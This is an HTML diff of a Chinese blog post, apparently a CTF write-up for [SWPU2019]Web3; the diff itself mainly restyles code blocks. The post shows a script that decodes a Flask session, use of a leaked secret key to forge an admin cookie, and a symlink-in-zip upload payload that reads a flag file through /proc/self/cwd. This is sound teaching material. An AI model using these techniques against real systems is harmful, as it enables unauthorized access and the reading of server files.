@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -246,7 +254,7 @@
             
             <div class="markdown-body">
               <h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>打开环境<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png" srcset="/img/loading.gif"><br>随便登个admin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png" srcset="/img/loading.gif"><br>点击<code>upload</code>会得到<code>Permission denied!</code><br>注意到网站标题是<code>CTF-Flask-Demo</code>,所以去解一下session<br>解密脚本：</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
 <span class="hljs-comment"># flask-session-cookie-manager-master  也能解session</span>
 <span class="hljs-keyword">import</span> sys
 <span class="hljs-keyword">import</span> zlib
@@ -279,20 +287,20 @@
     <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
-    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre></div>
+    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre>
 
-<div class="hljs"><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg
-&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre></div>
+<pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg
+&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre>
 <p>之后伪造cookie,让id为<code>b&#39;1&#39;</code>,需要key</p>
 <p>然后，如果访问网站不存在的路由会返回<code>404 not found</code>但status是200，在响应头里有：<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p>
 <p>base64解码后得到：<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p>
 <p>然后用<code>flask-session-cookie-manager</code>加密即可</p>
-<div class="hljs"><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;
-.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre></div>
+<pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;
+.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre>
 <p><code>/upload</code>页面更换cookie</p>
 <p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png" srcset="/img/loading.gif">    </p>
 <p>得到文件上传的页面，且注释中有源码</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span>
+<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span>
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>
     <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:
         <span class="hljs-keyword">return</span> render_template_string(temp)
@@ -367,21 +375,21 @@
         resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>
         <span class="hljs-keyword">return</span> resp
     <span class="hljs-keyword">else</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre></div>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre>
 
 
 <p>两个路由，第一个要求上传个图片压缩包，第二个说明flag在flask根目录下的flag里的flag.jpg中</p>
 <p><code>showflag()</code>路由的<code>True==False</code>是恒<code>False</code>的，所以不能通过第二个路由拿到flag，这里通过第一个路由上传个软链接读取文件      </p>
 <p><code>ln -s</code>是Linux的一种软连接，相当于Windows的快捷方式<br>比如</p>
-<div class="hljs"><pre><code>┌──(root💀kali)-[~/桌面]
-└─# ln -s /etc/passwd test       </code></pre></div>
+<pre><code>┌──(root💀kali)-[~/桌面]
+└─# ln -s /etc/passwd test       </code></pre>
 <p>打开<code>test</code>中就是<code>/etc/passwd</code>中的内容了        </p>
 <p><code>/proc/self</code> 记录了系统运行的信息状态等,<code>cwd</code>指向当前进程运行目录的一个符号链接,即flask运行进程目录      </p>
 <p>payload:   </p>
-<div class="hljs"><pre><code>┌──(root💀kali)-[~]
+<pre><code>┌──(root💀kali)-[~]
 └─# ln -s /proc/self/cwd/flag/flag.jpg test
 ┌──(root💀kali)-[~]
-└─# zip -ry test.zip test</code></pre></div>
+└─# zip -ry test.zip test</code></pre>
 <p>然后将<code>test.zip</code>上传即可得到flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png" srcset="/img/loading.gif"></p>
 
             </div>
@@ -540,6 +548,8 @@
 
 
 
+  
+    
   
 
 
